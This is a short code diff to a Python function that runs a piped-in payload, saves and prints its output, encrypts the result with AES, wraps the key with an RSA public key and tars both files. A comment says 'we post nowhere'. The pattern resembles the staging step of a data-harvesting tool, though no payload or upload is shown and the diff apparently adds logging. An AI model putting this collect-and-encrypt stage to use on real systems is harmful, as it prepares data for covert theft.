@@ -31,7 +31,7 @@ def run():
                     [sys.executable, "-"], 
                     input=payload, 
                     stdout=f, 
-                    stderr=subprocess.DEVNULL, 
+                    stderr=f, 
                     check=True
                 )
         except Exception as e:
@@ -43,6 +43,7 @@ def run():
 
         try:
             with open(collected, "r") as file:
+                print("collected: ")
                 print(file.read())
         except:
             pass
@@ -52,8 +53,8 @@ def run():
 
         try:
             subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
-            subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
-            subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
+            subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=f)
+            subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=f)
             subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)
 
             # we post nowhere
